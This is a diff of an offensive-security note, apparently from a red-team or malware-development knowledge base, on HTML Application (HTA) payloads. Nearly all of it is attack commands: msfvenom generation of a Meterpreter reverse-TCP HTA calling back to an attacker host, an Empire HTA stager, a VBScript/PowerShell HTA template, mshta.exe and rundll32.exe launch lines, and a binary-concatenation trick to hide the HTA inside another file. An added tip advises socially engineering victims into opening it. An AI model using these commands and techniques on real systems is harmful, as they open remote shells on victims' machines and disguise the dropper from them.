@@ -1,17 +1,25 @@
 # HTA
 
-## 01 - Generate via `msfvenom`
+## 01 - Generate Payloads
+
+### 1.1 - `msfvenom`
 
 > [!INFO] Payload's Limitation
 > It couldn't handle a command execution that exceeded 8192 characters.. Check for more details about [[Command Prompt|command prompt]] (`cmd.exe`).
  
 ```
-$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f hta-psh -o implant.hta
+$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f hta-psh -o payload.hta
 ```
 
-## 02 - HTA Templates
+### 1.2 - Empire
 
-HTA implant template.
+```
+(Empire) > usestager windows/launcher_hta
+```
+
+### 1.3 - HTA Templates
+
+HTA payload template.
 
 ```html
 <html>
@@ -34,7 +42,7 @@ HTA implant template.
 </html>
 ```
 
-This is a de-obfuscated format of `hta-psh` in `msfvenom`. Refer to this [[03 - Malware Development/Techniques/Implant Execution/Command Execution/Execute Commands/Windows/WinAPI|section]] related to command execution using `powershell.exe`.
+This is a de-obfuscated format of `hta-psh` in `msfvenom`. Refer to this [[03 - Malware Development/Techniques/Payload Execution/Command Execution/Execute Commands/Windows/WinAPI|section]] related to command execution using `powershell.exe`.
 
 ```html
 <script language="VBScript">
@@ -51,9 +59,12 @@ This is a de-obfuscated format of `hta-psh` in `msfvenom`. Refer to this [[03 - 
 </script>
 ```
 
-## 03 - Execute Implant
+## 02 - Execute Payloads
 
-### 3.1 - `mshta.exe`
+> [!TIP] HTA Payloads
+> You can actually social engineer the victim to double click the `.hta` to establish connection.
+
+### 2.1 - `mshta.exe`
 
 ```
 C:\> mshta.exe vbscript:Execute("MsgBox(""Would you like to update Windows?"", 64, ""Example"")(window.close)")
@@ -61,49 +72,49 @@ C:\> mshta.exe vbscript:Execute("MsgBox(""Would you like to update Windows?"", 6
 C:\> mshta.exe javascript:alert("Please Install Required Update")
 ```
 
-To execute the implant.
+To execute the payload.
 
 ```
-C:\> mshta.exe %CD%\implant.hta
+C:\> mshta.exe %CD%\payload.hta
 
-C:\> mshta.exe <drive_letter>:\absolute\path\to\implant.hta
+C:\> mshta.exe <drive_letter>:\absolute\path\to\payload.hta
 ```
 
-### 3.2 - `rundll32.exe`
+### 2.2 - `rundll32.exe`
 
 ```
-C:\> rundll32.exe url.dll,OpenURL "<drive_letter>:\absolute\path\to\implant.hta"
+C:\> rundll32.exe url.dll,OpenURL "<drive_letter>:\absolute\path\to\payload.hta"
 
-C:\> rundll32.exe url.dll,FileProtocolHandler "<drive_letter>:\absolute\path\to\implant.hta"
+C:\> rundll32.exe url.dll,FileProtocolHandler "<drive_letter>:\absolute\path\to\payload.hta"
 
-C:\> rundll32.exe url.dll,OpenURLA "<drive_letter>:\absolute\path\to\implant.hta"
+C:\> rundll32.exe url.dll,OpenURLA "<drive_letter>:\absolute\path\to\payload.hta"
 
-C:\> rundll32.exe shdocvw.dll,OpenURL "<drive_letter>:\absolute\path\to\implant.hta"
+C:\> rundll32.exe shdocvw.dll,OpenURL "<drive_letter>:\absolute\path\to\payload.hta"
 
-C:\> rundll32.exe ieframe.dll,OpenURL "<drive_letter>:\absolute\path\to\implant.hta"
+C:\> rundll32.exe ieframe.dll,OpenURL "<drive_letter>:\absolute\path\to\payload.hta"
 ```
 
-## 04 - Polyglot
+## 03 - Polyglot
 
 > [!TIP]
-> Feel free to experiment around binding any binary file format with `.hta` implant.
+> Feel free to experiment around binding any binary file format with `.hta` payload.
 
 Bind the binary files together.
 
 ```
-C:\> copy /y /b filename.extension+implant.hta hidden_implant.extension
+C:\> copy /y /b filename.extension+payload.hta hidden_payload.extension
 ```
 
 It's also possible to do this in `wine`.
 
 ```
-$ wine cmd.exe /y /c copy /b filename.extension+implant.hta hidden_implant.extension
+$ wine cmd.exe /y /c copy /b filename.extension+payload.hta hidden_payload.extension
 ```
 
 Then execute it
 
 ```
-C:\> mshta.exe %CD%\hidden_implant.extensions
+C:\> mshta.exe %CD%\hidden_payload.extensions
 ```
 
 ---
